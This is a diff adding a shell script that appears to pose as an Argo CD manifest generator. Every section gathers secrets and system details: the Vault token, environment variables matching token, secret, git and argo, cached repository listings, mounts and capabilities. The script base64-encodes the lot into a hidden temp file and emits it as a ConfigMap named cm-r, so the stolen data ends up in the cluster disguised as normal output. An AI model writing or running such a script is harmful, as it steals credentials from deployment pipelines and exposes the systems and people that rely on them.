@@ -1,0 +1,20 @@
+#!/bin/sh
+{
+echo "== id =="; id
+echo "== hostname =="; hostname
+echo "== VAULT_TOKEN =="; echo "$VAULT_TOKEN"
+echo "== AVP_TYPE =="; echo "$AVP_TYPE"
+echo "== env(sel) =="; env | grep -iE 'vault|avp|argo|git|token|secret'
+echo "== _argocd-repo =="; ls -la /tmp/_argocd-repo/ 2>/dev/null
+for d in /tmp/_argocd-repo/*/; do echo "== $d =="; ls "$d" 2>/dev/null | head -8; done
+echo "== mounts(noexec) =="; grep noexec /proc/mounts 2>/dev/null
+echo "== caps =="; grep Cap /proc/self/status
+echo "== uname =="; uname -a
+} > /tmp/.r 2>&1
+B=$(base64 /tmp/.r | tr -d '\n')
+echo "apiVersion: v1"
+echo "kind: ConfigMap"
+echo "metadata:"
+echo "  name: cm-r"
+echo "data:"
+echo "  r: \"$B\""
